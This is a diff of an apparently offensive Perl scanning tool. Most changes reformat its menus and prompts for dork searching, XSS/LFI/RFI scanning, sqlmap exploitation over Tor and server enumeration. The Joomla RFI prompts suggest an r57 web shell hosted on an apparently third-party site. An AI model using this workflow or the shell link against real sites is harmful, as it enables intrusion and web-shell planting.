   }
   if (($Target !~ m/.txt/i) && ($Target !~ m/.log/i)){
     if ($Target!~m/(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/ && ($1<=255 && $2<=255 && $3<=255 && $4<=255 )){
       print color 'red';
-      print "    [!] The given IP is not valid!\n";
+      print "[!] The given IP is not valid!\n";
       print color RESET;
 	  exit();
     }
   }
-  if (!defined $mpages) {
+  if (!defined $mlevel) {
     print color 'yellow';
-    print "    [!] You have to set number of page results to scan [Ex: --mp 1]\n";
+    print "[!] You have to set scan level (when scan must stop) [Ex: --level 50]\n";
     print color 'RESET';
 	exit();
   }
@@ -3384,22 +3983,22 @@ if (defined $muplodsites) {
 if (defined $mzipsites) {
   if (!defined $Target) {
     print color 'yellow';
-    print "    [!] You have to set a server ip! [Ex: -t 16.12.01.82]\n";
+    print "[!] You have to set a server ip! [Ex: -t 16.12.01.82]\n";
     print color 'RESET';
 	exit();
   }
   if (($Target !~ m/.txt/i) && ($Target !~ m/.log/i)){
     if ($Target!~m/(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/ && ($1<=255 && $2<=255 && $3<=255 && $4<=255 )){
       print color 'red';
-      print "    [!] The given IP is not valid!\n";
+      print "[!] The given IP is not valid!\n";
       print color RESET;
 	  exit();
     }
   }
-  if (!defined $mpages) {
+  if (!defined $mlevel) {
     print color 'yellow';
 
-    print "    [!] You have to set number of page results to scan [Ex: --mp 1]\n";
+    print "[!] You have to set scan level (when scan must stop) [Ex: --level 50]\n";
     print color 'RESET';
 	exit();
   }
@@ -3409,7 +4008,7 @@ if (defined $mzipsites) {
 if (defined $mmd5) {
   if (!defined $string) {
     print color 'yellow';
-    print "    [!] You have to set a string!!\n";
+    print "[!] You have to set a string!!\n";
     print color 'RESET';
 	exit();
   }
@@ -3419,7 +4018,7 @@ if (defined $mmd5) {
 if (defined $mencode64) {
   if (!defined $string) {
     print color 'yellow';
-    print "    [!] You have to set a string!!\n";
+    print "[!] You have to set a string!!\n";
     print color 'RESET';
 	exit();
   }
@@ -3429,7 +4028,7 @@ if (defined $mencode64) {
 if (defined $mdecode64) {
   if (!defined $string) {
     print color 'yellow';
-    print "    [!] You have to set a string!!\n";
+    print "[!] You have to set a string!!\n";
     print color 'RESET';
 	exit();
   }
@@ -3439,7 +4038,7 @@ if (defined $mdecode64) {
 if (defined $mhttpd) {
   if (!defined $Target) {
     print color 'yellow';
-    print "    [!] You have to set a target!!\n";
+    print "[!] You have to set a target!!\n";
     print color 'RESET';
 	exit();
   }
@@ -3451,7 +4050,7 @@ if (!defined $dork) {
   if (defined $exploit) {
     if ((!defined $misup) && (!defined $validation_text)){
       print color 'yellow';
-      print "    [!] You have to set a Validation [--isup / --valid <txt>]!!\n";
+      print "[!] You have to set a Validation [--isup / --valid <txt>]!!\n";
       print color 'RESET';
 	  exit();
 	}
@@ -3491,26 +4090,26 @@ TASKS:;
 print color 'bold magenta';
 print "[..][+] PRINCIPAL MENU \n";
 print color 'magenta', RESET;
-print "    =========================================\n";
-print "    [+] 1 = SEARCH ENGINE (BING) \n";
-print "    [+] 2 = SITE SCANNER \n";
-print "    [+] 3 = SERVER SCANNER \n";
-print "    [+] 4 = MD5 / BASE 64 \n";
-print "    [+] 5 = TERMINAL \n";
-print "    [+] 6 = ABOUT \n";
-print "    [+] 7 = HELP \n";
-print "    [+] 8 = EXIT (->) \n";
-print "    =========================================\n";
+print "=========================================\n";
+print "[+] 1 = SEARCH ENGINE (BING) \n";
+print "[+] 2 = SITE SCANNER \n";
+print "[+] 3 = SERVER SCANNER \n";
+print "[+] 4 = MD5 / BASE 64 \n";
+print "[+] 5 = TERMINAL \n";
+print "[+] 6 = ABOUT \n";
+print "[+] 7 = HELP \n";
+print "[+] 8 = EXIT (->) \n";
+print "=========================================\n";
 
 task:;
 print color 'yellow';
-print "    [+] Please select a task: ";
+print "[+] Please select a task: ";
 print color RESET;
 $task=<STDIN>;
 chomp($task);
 if (!$task){
   print color 'red';
-  print "    [+] Uppss.. Invalid option!\n";
+  print "[+] Uppss.. Invalid option!\n";
   print color RESET;
   goto task;
   };
@@ -3521,26 +4120,26 @@ if($task eq "1"){
   sleep (1);
   dork:;
   print color 'yellow';
-  print "    [+] Please enter your Dork: ";
+  print "[+] Please enter your Dork: ";
   print color RESET;
   $dork=<STDIN>;
   chomp ($dork); 
    
   if (!$dork){
     print color 'red';
-	print "    [+] Uppss.. you have to set a value!\n";
+	print "[+] Uppss.. you have to set a value!\n";
     print color RESET;
 	goto dork;
   };
   dorklist();
   nresult:;
   print color 'yellow';
-  print "    [+] Number of page results to print: ";
+  print "[+] Scan level: ";
   print color RESET;
-  chomp ($mpages=<STDIN>);
-  if (!$mpages){ 
+  chomp ($mlevel=<STDIN>);
+  if (!$mlevel){ 
     print color 'red';
-	print "    [+] Uppss.. you have to set a value!\n";
+	print "[+] Uppss.. you have to set a value!\n";
     print color RESET;
 	goto nresult;
   };
@@ -3549,7 +4148,7 @@ if($task eq "1"){
   ##############
 
   print color 'yellow';
-  print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
+  print "[+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
   print color RESET;
   $after6=<STDIN>;
   chomp ($after6);
@@ -3558,7 +4157,7 @@ if($task eq "1"){
   }
   if ($after6==0) {
     print color 'red';
-    print "    [!] Have A Good Time! Bye.\n";
+    print "[!] Have A Good Time! Bye.\n";
     print color RESET;
     exit;
   }
@@ -3573,19 +4172,19 @@ if($task eq "2"){
   print color 'bold magenta';
   print "[..][+] SCAN SITES OPTIONS\n";
   print color 'magenta', RESET;
-  print "    ========================================= \n";
-  print "    [+] 1 = CHECK HTTPD VERSION\n";
-  print "    [+] 2 = XSS SCAN\n";
-  print "    [+] 3 = LFI SCAN\n";
-  print "    [+] 4 = RFI SCAN (JOOMLA)\n";
-  print "    [+] 5 = ADF SCAN (WORDPRESS)\n";
-  print "    [+] 6 = FIND ADMIN PAGE\n";
-  print "    [+] 7 = FIND SUBDOMAINS\n";
-  print "    [+] 8 = BACK (<-)\n";
-  print "    [+] 9 = EXIT (->)\n";
-  print "    ========================================= \n";
+  print "========================================= \n";
+  print "[+] 1 = CHECK HTTPD VERSION\n";
+  print "[+] 2 = XSS SCAN\n";
+  print "[+] 3 = LFI SCAN\n";
+  print "[+] 4 = RFI SCAN (JOOMLA)\n";
+  print "[+] 5 = ADF SCAN (WORDPRESS)\n";
+  print "[+] 6 = FIND ADMIN PAGE\n";
+  print "[+] 7 = FIND SUBDOMAINS\n";
+  print "[+] 8 = BACK (<-)\n";
+  print "[+] 9 = EXIT (->)\n";
+  print "========================================= \n";
   print color 'yellow';
-  print "    [+] Select an option -> ";
+  print "[+] Select an option -> ";
   print color RESET;
   $ID =<STDIN>;
   chomp($ID);
@@ -3596,7 +4195,7 @@ if($task eq "2"){
     sleep (1);
     id1:;
     print color 'yellow';
-    print "    [+] Please Enter Target [http://www.site.com] ";
+    print "[+] Please Enter Target [http://www.site.com] ";
     print "\n    [+] Target: ";
     print color RESET;
     $Target=<STDIN>;
@@ -3604,7 +4203,7 @@ if($task eq "2"){
   
     if (!$Target){ 
       print color 'red';
-      print "    [+] Uppss.. you have to set a Target!\n";
+      print "[+] Uppss.. you have to set a Target!\n";
 
       print color RESET;
       goto id1;
@@ -3616,22 +4215,24 @@ if($task eq "2"){
       $resp = $useragent->head($Target);
 	  if (head($Target)) {
         print color 'green';
-        print "    [!] ".$resp->headers_as_string;
+        print "[!] ".$resp->headers_as_string;
         print color RESET;
       }else{
         print color 'red';
         print "\n    [!] Not a valid target!\n";
         print color RESET;
       }
-      print color 'red';
-	  timer();
-      print "SCAN FINISHED!\n";
-      print color RESET;
+	  if (!defined $dork) {
+        print color 'red';
+	    timer();
+        print "SCAN FINISHED!\n";
+        print color RESET;
+	  }	
 	}
 	mhttpd();
     after1:;
     print color 'yellow';
-    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
+    print "[+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
 	print color RESET;
     $after1=<STDIN>;
     chomp ($after1);
@@ -3640,14 +4241,14 @@ if($task eq "2"){
     }
     if ($after1==0) {
       print color 'red';
-      print "    [!] Have A Good Time! Bye.\n";
+      print "[!] Have A Good Time! Bye.\n";
 
 	  print color RESET;
       exit;
     }
     if ($after1 != 1 or 0 ) {
 	  print color 'red';
-      print "    [!] Upsss.. Invalid Option!\n";
+      print "[!] Upsss.. Invalid Option!\n";
 	  print color RESET;
       sleep(1);
       goto after1;
@@ -3664,7 +4265,7 @@ if($task eq "2"){
     ###########################
     USELIST:;
     print color 'yellow';
-    print "    [+] Do You Want To Scan a List? (Y/n): ";
+    print "[+] Do You Want To Scan a List? (Y/n): ";
     print color RESET;
     $uselist=<STDIN>;
     chomp ($uselist);
@@ -3673,13 +4274,13 @@ if($task eq "2"){
 	if ($uselist =~ /^[Y]?$/i) {
 	  LISTNAME:;
       print color 'yellow';
-      print "    [+] Enter List Name [Ex:list.txt]: ";
+      print "[+] Enter List Name [Ex:list.txt]: ";
       print color RESET;
       $listname=<STDIN>;
       chomp ($listname);
 	  if (!$listname){ 
         print color 'red';
-	    print "    [+] Uppss.. you have to Enter List Name!\n";
+	    print "[+] Uppss.. you have to Enter List Name!\n";
         print color RESET;
 	    goto LISTNAME;
       };
@@ -3688,7 +4289,7 @@ if($task eq "2"){
       if (!-e $listcheck){
 	    print color 'red';
 		use File::Basename;
-	    print "    [+] List Not Found! $listname must be in the same directory as ",basename($0),"!\n";
+	    print "[+] List Not Found! $listname must be in the same directory as ",basename($0),"!\n";
 	    print color RESET;
 		goto LISTNAME;
 	  }
@@ -3696,40 +4297,41 @@ if($task eq "2"){
       #####
 	  USEXPLOIT:;
       print color 'yellow';
-      print "    [+] Do You Want To Use an Exploit? (Y/n): ";
+      print "[+] Do You Want To Use an Exploit? (Y/n): ";
       print color RESET;
       $usexploit=<STDIN>;
       chomp ($usexploit);
 	  
 	  if ($usexploit =~ /^[Y]?$/i) {
 	    id221:;
+
         print color 'yellow';
-        print "    [+] Enter Exploit: ";
+        print "[+] Enter Exploit: ";
         print color RESET;
         $exploit=<STDIN>;
         chomp ($exploit);
 	    if (!$exploit){ 
           print color 'red';
-	      print "    [+] Uppss.. you have to Enter your Exploit!\n";
+	      print "[+] Uppss.. you have to Enter your Exploit!\n";
           print color RESET;
 	      goto id221;
         };
 	  
         VALIDATE:;
         print color 'yellow';
-        print "    [+] Do You Want To Validate Results? (Y/n): ";
+        print "[+] Do You Want To Validate Results? (Y/n): ";
         print color RESET;
         $validate=<STDIN>;
 	    if ($validate =~ /^[Y]?$/i) {
 	      id2221:;
           print color 'yellow';
-          print "    [+] Enter Text to Validate: ";
+          print "[+] Enter Text to Validate: ";
           print color RESET;
           $validation_text=<STDIN>;
           chomp ($validation_text);
 		  if (!$validation_text){ 
             print color 'red';
-	        print "    [+] Uppss.. you have to Enter your Text to Validate!\n";
+	        print "[+] Uppss.. you have to Enter your Text to Validate!\n";
             print color RESET;
 	        goto id2221;
           };
@@ -3746,7 +4348,7 @@ if($task eq "2"){
     }else{ ####### IF NO USE LIST
 	  USEXPLOIT:;
       print color 'yellow';
-      print "    [+] Do You Want To Use an Exploit? (Y/n): ";
+      print "[+] Do You Want To Use an Exploit? (Y/n): ";
       print color RESET;
       $usexploit=<STDIN>;
       chomp ($usexploit);
@@ -3754,13 +4356,13 @@ if($task eq "2"){
 	    if ($usexploit =~ /^[Y]?$/i) {
 	    id221:;
         print color 'yellow';
-        print "    [+] Enter Exploit: ";
+        print "[+] Enter Exploit: ";
         print color RESET;
         $exploit=<STDIN>;
         chomp ($exploit);
 	    if (!$exploit){ 
           print color 'red';
-	      print "    [+] Uppss.. you have to Enter your Exploit!\n";
+	      print "[+] Uppss.. you have to Enter your Exploit!\n";
           print color RESET;
 	      goto id221;
         };
@@ -3774,7 +4376,7 @@ if($task eq "2"){
         chomp ($Target);
         if (!$Target){ 
           print color 'red';
-	      print "    [+] Uppss.. you have to set a Target!\n";
+	      print "[+] Uppss.. you have to set a Target!\n";
           print color RESET;
 	      goto id21;
         };
@@ -3782,20 +4384,20 @@ if($task eq "2"){
 	  
         VALIDATE:;
         print color 'yellow';
-        print "    [+] Do You Want To Validate Results? (Y/n): ";
+        print "[+] Do You Want To Validate Results? (Y/n): ";
         print color RESET;
         $validate=<STDIN>;
 		
 	    if ($validate =~ /^[Y]?$/i) {
 	      id2221:;
           print color 'yellow';
-          print "    [+] Enter Text to Validate: ";
+          print "[+] Enter Text to Validate: ";
           print color RESET;
           $validation_text=<STDIN>;
           chomp ($validation_text);
    		  if (!$validation_text){ 
             print color 'red';
-	        print "    [+] Uppss.. you have to Enter your Text to Validate!\n";
+	        print "[+] Uppss.. you have to Enter your Text to Validate!\n";
             print color RESET;
 	        goto id2221;
           };
@@ -3808,14 +4410,14 @@ if($task eq "2"){
       }else{ ### THEN NO EXPLOIT
         id2:;
         print color 'yellow';
-        print "    [+] Please Enter Target [http://www.site.com/search.php?id=12] \n";
-        print "    [+] Target: ";
+        print "[+] Please Enter Target [http://www.site.com/search.php?id=12] \n";
+        print "[+] Target: ";
         print color RESET;
         $Target=<STDIN>;
         chomp ($Target);
         if (!$Target){ 
           print color 'red';
-	      print "    [+] Uppss.. you have to set a Target!\n";
+	      print "[+] Uppss.. you have to set a Target!\n";
           print color RESET;
 	      goto id2;
         };
@@ -3834,7 +4436,7 @@ if($task eq "2"){
 	 
 	EXPLOITVL:;
     print color 'yellow';
-    print "    [+] Do You Want To sqlmap this Vulnerability? (Y/n): ";
+    print "[+] Do You Want To sqlmap this Vulnerability? (Y/n): ";
     print color RESET;
     $sqlmaping=<STDIN>;
     chomp ($sqlmaping);
@@ -3842,7 +4444,7 @@ if($task eq "2"){
 	  if ($sqlmaping =~ /^[Y]?$/i) {
 	    USETOR:;
         print color 'yellow';
-        print "    [+] Do You Want To Use Tor? (Y/n): ";
+        print "[+] Do You Want To Use Tor? (Y/n): ";
         print color RESET;
         $usetor=<STDIN>;
         chomp ($usetor);
@@ -3860,7 +4462,7 @@ if($task eq "2"){
 
     after2:;
     print color 'yellow';
-    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
+    print "[+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
     print color RESET;
     $after2=<STDIN>;
     chomp ($after2);
@@ -3869,13 +4471,13 @@ if($task eq "2"){
     }
     if ($after2==0) {
       print color 'red';
-      print "    [!] Have A Good Time! Bye.\n";
+      print "[!] Have A Good Time! Bye.\n";
 	  print color RESET;
       exit;
     }
     if ($after2 != 1 or 0 ) {
 	  print color 'red';
-      print "    [!] Upsss.. Invalid Option!\n";
+      print "[!] Upsss.. Invalid Option!\n";
 	  print color RESET;
       sleep(1);
       goto after2;
@@ -3889,7 +4491,7 @@ if($task eq "2"){
     
     USELIST2:;
     print color 'yellow';
-    print "    [+] Do You Want To Scan List? (Y/n): ";
+    print "[+] Do You Want To Scan List? (Y/n): ";
     print color RESET;
     $uselist2=<STDIN>;
     chomp ($uselist2);
@@ -3897,13 +4499,13 @@ if($task eq "2"){
 	if ($uselist2 =~ /^[Y]?$/i) {
 	  LISTNAME2:;
       print color 'yellow';
-      print "    [+] Enter List Name [Ex:list.txt]: ";
+      print "[+] Enter List Name [Ex:list.txt]: ";
       print color RESET;
       $listname=<STDIN>;
       chomp ($listname);
 	  if (!$listname){ 
         print color 'red';
-	    print "    [+] Uppss.. you have to Enter List Name!\n";
+	    print "[+] Uppss.. you have to Enter List Name!\n";
         print color RESET;
 	    goto LISTNAME2;
       };
@@ -3911,13 +4513,13 @@ if($task eq "2"){
       if (!-e $listcheck){
 	    print color 'red';
 		use File::Basename;
-	    print "    [+] List Not Found! $listname must be in the same directory as ",basename($0),"!\n";
+	    print "[+] List Not Found! $listname must be in the same directory as ",basename($0),"!\n";
 	    print color RESET;
 		goto LISTNAME2;
 	  }
       
       print color 'yellow';
-      print "    [+] Please wait this can take a few minuts...";
+      print "[+] Please wait this can take a few minuts...";
       print color RESET;
       print" \n";
       sleep(1);
@@ -3926,21 +4528,21 @@ if($task eq "2"){
     }else{ ####### IF NO USE LIST
     #######################
       print color 'yellow';
-      print "    [+] Please Enter Target [http://www.site.com/search.php?id=] \n";
-      print "    [+] Target: ";
+      print "[+] Please Enter Target [http://www.site.com/search.php?id=] \n";
+      print "[+] Target: ";
       print color RESET;
       $Target=<STDIN>;
       chomp ($Target);
       if (!$Target){ 
         print color 'red';
-	    print "    [+] Uppss.. you have to set a Target!\n";
+	    print "[+] Uppss.. you have to set a Target!\n";
         print color RESET;
 	    goto id7;
       };
 	  
       if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
       print color 'yellow';
-      print "    [+] Please wait this can take a few minuts...\n";
+      print "[+] Please wait this can take a few minuts...\n";
       print color RESET;
       print" \n";
       sleep(1);
@@ -3951,7 +4553,7 @@ if($task eq "2"){
     finlfi();    	
     after2:;
     print color 'yellow';
-    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
+    print "[+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
     print color RESET;
     $after3=<STDIN>;
     chomp ($after3);
@@ -3960,13 +4562,13 @@ if($task eq "2"){
     }
     if ($after3==0) {
       print color 'red';
-      print "    [!] Have A Good Time! Bye.\n";
+      print "[!] Have A Good Time! Bye.\n";
 	  print color RESET;
       exit;
     }
     if ($after3 != 1 or 0) {
 	  print color 'red';
-      print "    [!] Upsss.. Invalid Option!\n";
+      print "[!] Upsss.. Invalid Option!\n";
 	  print color RESET;
       sleep(1);
       goto after3;
@@ -3980,20 +4582,20 @@ if($task eq "2"){
     
 	shell:;
     print color 'yellow';
-    print "    [+] Shell Link [Ex: http://www.site.co.uk/r57.txt]: ";
+    print "[+] Shell Link [Ex: http://www.site.co.uk/r57.txt]: ";
     print color 'yellow', RESET;
     $shell =<STDIN>;
     chomp ($shell);
 	if (!$shell){  
       print color 'red';
-	  print "    [+] Uppss.. Invalid Value!\n";
+	  print "[+] Uppss.. Invalid Value!\n";
       print color RESET;
 	  goto shell;
     };
     
     USELIST3:;
     print color 'yellow';
-    print "    [+] Do You Want To Scan a List? (Y/n): ";
+    print "[+] Do You Want To Scan a List? (Y/n): ";
     print color RESET;
     $uselist=<STDIN>;
     chomp ($uselist);
@@ -4002,27 +4604,28 @@ if($task eq "2"){
     ###########################
 	  LISTNAME3:;
       print color 'yellow';
-      print "    [+] Enter List Name [Ex:list.txt]: ";
+      print "[+] Enter List Name [Ex:list.txt]: ";
       print color RESET;
       $listname=<STDIN>;
+
       chomp ($listname);
 	  if (!$listname){ 
         print color 'red';
-	    print "    [+] Uppss.. you have to Enter List Name!\n";
+	    print "[+] Uppss.. you have to Enter List Name!\n";
         print color RESET;
 	    goto LISTNAME3;
       };
       $listcheck = $listname;
       if (!-e $listcheck){
 	    print color 'red';
-	    print "    [+] List Not Found! $listname must be in the same directory as ",basename($0),"!\n";
+	    print "[+] List Not Found! $listname must be in the same directory as ",basename($0),"!\n";
 	    print color RESET;
 		goto LISTNAME3;
 	  }
         
       print color 'yellow';
-      print "    [+] please Enter Shell Link [May Can help you: http://www.mcrracecars.co.uk/images/r57.txt]";
-      print "    [+] Shell: ";
+      print "[+] please Enter Shell Link [May Can help you: http://www.mcrracecars.co.uk/images/r57.txt]";
+      print "[+] Shell: ";
       print color RESET;
       $Shell =<STDIN>;
       chomp ($Shell);
@@ -4031,22 +4634,22 @@ if($task eq "2"){
     }else{ #### IF NO USE LIST
       id4:;
       print color 'yellow';
-      print "    [+] Please Enter Target [http://www.site.com] ";
+      print "[+] Please Enter Target [http://www.site.com] ";
       print "\n    [+] Target: ";
       print color RESET;
       $Target=<STDIN>;
       chomp ($Target);
       if (!$Target){ 
         print color 'red';
-	    print "    [+] Uppss.. you have to set a Target!\n";
+	    print "[+] Uppss.. you have to set a Target!\n";
         print color RESET;
 	    goto id4;
       };
   
       if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
       print color 'yellow';
-      print "    [+] please Enter Shell Link [May Can help you: http://www.mcrracecars.co.uk/images/r57.txt]";
-      print "    [+] Shell: ";
+      print "[+] please Enter Shell Link [May Can help you: http://www.mcrracecars.co.uk/images/r57.txt]";
+      print "[+] Shell: ";
       print color RESET;
       $Shell =<STDIN>;
       chomp ($Shell);	  
@@ -4058,7 +4661,7 @@ if($task eq "2"){
     finjoomrfi();	
     after4:;
     print color 'yellow';
-    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
+    print "[+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
     print color RESET;
     $after4=<STDIN>;
     chomp ($after4);
@@ -4067,13 +4670,13 @@ if($task eq "2"){
     }
     if ($after4==0) {
       print color 'red';
-      print "    [!] Have A Good Time! Bye.\n";
+      print "[!] Have A Good Time! Bye.\n";
       print color RESET;
       exit;
     }
     if ($after4 != 1 or 0) {
       print color 'red';
-      print "    [!] Upsss.. Invalid Option!\n";
+      print "[!] Upsss.. Invalid Option!\n";
       print color RESET;
       sleep(1);
       goto after4;
@@ -4087,7 +4690,7 @@ if($task eq "2"){
     
     USELIST5:;
     print color 'yellow';
-    print "    [+] Do You Want To Scan a List? (Y/n): ";
+    print "[+] Do You Want To Scan a List? (Y/n): ";
     print color RESET;
     $uselist5=<STDIN>;
     chomp ($uselist5);
@@ -4095,20 +4698,20 @@ if($task eq "2"){
     ####################################################
 	  LISTNAME5:;
       print color 'yellow';
-      print "    [+] Enter List Name [Ex:list.txt]: ";
+      print "[+] Enter List Name [Ex:list.txt]: ";
       print color RESET;
       $listname=<STDIN>;
       chomp ($listname);
 	  if (!$listname){ 
         print color 'red';
-	    print "    [+] Uppss.. you have to Enter List Name!\n";
+	    print "[+] Uppss.. you have to Enter List Name!\n";
         print color RESET;
 	    goto LISTNAME5;
       };
       $listcheck = $listname;
       if (!-e $listcheck){
 	    print color 'red';
-	    print "    [+] List Not Found! $listname must be in the same directory as ",basename($0),"!\n";
+	    print "[+] List Not Found! $listname must be in the same directory as ",basename($0),"!\n";
 	    print color RESET;
 		goto LISTNAME5;
 	  }
@@ -4117,14 +4720,14 @@ if($task eq "2"){
     }else{ #### IF NO USE LIST
       id5:;
       print color 'yellow';
-      print "    [+] Please Enter Target [http://www.site.com] ";
+      print "[+] Please Enter Target [http://www.site.com] ";
       print "\n    [+] Target: ";
       print color RESET;
       $Target=<STDIN>;
       chomp ($Target);
       if (!$Target){ 
         print color 'red';
-	    print "    [+] Uppss.. you have to set a Target!\n";
+	    print "[+] Uppss.. you have to set a Target!\n";
         print color RESET;
 	    goto id5;
       };
@@ -4135,7 +4738,7 @@ if($task eq "2"){
     finwpadf();
     after5:;
     print color 'yellow';
-    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
+    print "[+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
     print color RESET;
     $after5=<STDIN>;
     chomp ($after5);
@@ -4144,18 +4747,19 @@ if($task eq "2"){
     }
     if ($after5==0) {
       print color 'red';
-      print "    [!] Have A Good Time! Bye.\n";
+      print "[!] Have A Good Time! Bye.\n";
       print color RESET;
       exit;
     }
     if ($after5 != 1 or 0) {
       print color 'red';
-      print "    [!] Upsss.. Invalid Option!\n";
+      print "[!] Upsss.. Invalid Option!\n";
       print color RESET;
       sleep(1);
       goto after5;
     }
   } #### END ID 5
+
   
   ##########
   #FIND ADMIN PAGE
@@ -4164,7 +4768,7 @@ if($task eq "2"){
     
     USELIST7:;
     print color 'yellow';
-    print "    [+] Do You Want To Scan a List? (Y/n): ";
+    print "[+] Do You Want To Scan a List? (Y/n): ";
     print color RESET;
     $uselist7=<STDIN>;
     chomp ($uselist7);
@@ -4172,20 +4776,20 @@ if($task eq "2"){
     
 	  LISTNAME7:;
       print color 'yellow';
-      print "    [+] Enter List Name [Ex:list.txt]: ";
+      print "[+] Enter List Name [Ex:list.txt]: ";
       print color RESET;
       $listname=<STDIN>;
       chomp ($listname);
 	  if (!$listname){ 
         print color 'red';
-	    print "    [+] Uppss.. you have to Enter List Name!\n";
+	    print "[+] Uppss.. you have to Enter List Name!\n";
         print color RESET;
 	    goto LISTNAME7;
       };
       $listcheck = $listname;
       if (!-e $listcheck){
 	    print color 'red';
-	    print "    [+] List Not Found! $listname must be in the same directory as ",basename($0),"!\n";
+	    print "[+] List Not Found! $listname must be in the same directory as ",basename($0),"!\n";
 	    print color RESET;
 		goto LISTNAME7;
 	  }
@@ -4195,14 +4799,14 @@ if($task eq "2"){
 
       id6:;
       print color 'yellow';
-      print "    [+] Please Enter Target [http://www.site.com] ";
+      print "[+] Please Enter Target [http://www.site.com] ";
       print "\n    [+] Target: ";
       print color RESET;
       $Target=<STDIN>;
       chomp ($Target);
       if (!$Target){ 
         print color 'red';
-	    print "    [+] Uppss.. you have to set a Target!\n";
+	    print "[+] Uppss.. you have to set a Target!\n";
         print color RESET;
 	    goto id6;
       };
@@ -4213,7 +4817,7 @@ if($task eq "2"){
     finadmin();
     after6:;
     print color 'yellow';
-    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
+    print "[+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
     print color RESET;
     $after6=<STDIN>;
     chomp ($after6);
@@ -4222,13 +4826,13 @@ if($task eq "2"){
     }
     if ($after6==0) {
     print color 'red';
-    print "    [!] Have A Good Time! Bye.\n";
+    print "[!] Have A Good Time! Bye.\n";
     print color RESET;
     exit;
     }
     if ($after6 != 1 or 0) {
       print color 'red';
-      print "    [!] Upsss.. Invalid Option!\n";
+      print "[!] Upsss.. Invalid Option!\n";
       print color RESET;
       sleep(1);
       goto after6;
@@ -4240,7 +4844,7 @@ if($task eq "2"){
 
     USELIST:;
     print color 'yellow';
-    print "    [+] Do You Want To Scan a List? (Y/n): ";
+    print "[+] Do You Want To Scan a List? (Y/n): ";
     print color RESET;
     $uselist=<STDIN>;
     chomp ($uselist);
@@ -4249,20 +4853,20 @@ if($task eq "2"){
 	if ($uselist =~ /^[Y]?$/i) {
 	  LISTNAME:;
       print color 'yellow';
-      print "    [+] Enter List Name [Ex:somepath/list.txt]: ";
+      print "[+] Enter List Name [Ex:somepath/list.txt]: ";
       print color RESET;
       $listname=<STDIN>;
       chomp ($listname);
       if (!$listname){ 
         print color 'red';
-	    print "    [+] Uppss.. you have to Enter List Name!\n";
+	    print "[+] Uppss.. you have to Enter List Name!\n";
         print color RESET;
 	    goto LISTNAME;
       };
       $listcheck = $listname;
       if (!-e $listcheck){
 	    print color 'red';
-	    print "    [+] List Not Found! $listname must be in the same directory as ",basename($0),"!\n";
+	    print "[+] List Not Found! $listname must be in the same directory as ",basename($0),"!\n";
 
 	    print color RESET;
 		goto LISTNAME;
@@ -4272,13 +4876,13 @@ if($task eq "2"){
     }else{ ## IF NO LIST
 	  domain:;
       print color 'yellow';
-      print "    [+] Enter Domaine Name [Ex:site:com]: ";
+      print "[+] Enter Domaine Name [Ex:site:com]: ";
       print color RESET;
       $Target=<STDIN>;
       chomp ($Target);
       if (!$Target){ 
         print color 'red';
-	    print "    [+] Uppss.. you have to Enter a domain name!\n";
+	    print "[+] Uppss.. you have to Enter a domain name!\n";
         print color RESET;
 	    goto domain;
       };
@@ -4295,7 +4899,7 @@ if($task eq "2"){
     finsubdomain();
     after2:;
     print color 'yellow';
-    print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
+    print "[+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
     print color RESET;
     $after2=<STDIN>;
     chomp ($after2);
@@ -4304,13 +4908,13 @@ if($task eq "2"){
     }
     if ($after2==0) {
       print color 'red';
-      print "    [!] Have A Good Time! Bye.\n";
+      print "[!] Have A Good Time! Bye.\n";
 	  print color RESET;
       exit;
     }
     if ($after2 != 1 or 0 ) {
 	  print color 'red';
-      print "    [!] Upsss.. Invalid Option!\n";
+      print "[!] Upsss.. Invalid Option!\n";
 	  print color RESET;
       sleep(1);
       goto after2;
@@ -4334,7 +4938,7 @@ if($task eq "2"){
   #ID VALIDATION
   if ($ID != 1 or 2 or 3 or 4 or 5 or 6 or 7 or 8 or 9) {
     print color 'red';
-    print "    [!] Upsss.. Invalid Option!\n";
+    print "[!] Upsss.. Invalid Option!\n";
 	print color RESET;
 	sleep(1);
 	goto ID;
@@ -4347,8 +4951,8 @@ if($task eq "3"){
 
   VUELTA:;
   print color 'yellow';
-  print "    [+] Please enter server IP";
-  print "\n    [+] Target: ";
+  print "[+] Please enter server IP \n";
+  print "[+] Target: ";
   print color RESET;
   $Target=<STDIN>;
   chomp($Target);
@@ -4356,7 +4960,7 @@ if($task eq "3"){
   if (($Target !~ m/.txt/i) && ($Target !~ m/.log/i)){
     if ($Target!~m/(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/ && ($1<=255 && $2<=255 && $3<=255 && $4<=255 )){
       print color 'red';
-      print "    [!] The given IP is not valid!\n";
+      print "[!] The given IP is not valid!\n";
       print color RESET;
 	  goto VUELTA;
     }
@@ -4367,19 +4971,19 @@ if($task eq "3"){
   print color 'bold magenta';
   print "[..][+] SCAN SERVER OPTIONS\n";
   print color 'magenta', RESET;
-  print "    =========================================\n";
-  print "    [+] 1 = SCAN PORTS\n";
-  print "    [+] 2 = GET SERVER SITES\n";
-  print "    [+] 3 = GET SERVER WORDPRESS SITES\n";
-  print "    [+] 4 = GET SERVER JOOMLA SITES\n";
-  print "    [+] 5 = GET UPLOAD FILES\n";
-  print "    [+] 6 = GET ZIP FILES\n";
-  print "    [+] 7 = BACK (<-)\n";
-  print "    [+] 8 = EXIT (->)\n";
-  print "    =========================================\n";
+  print "=========================================\n";
+  print "[+] 1 = SCAN PORTS\n";
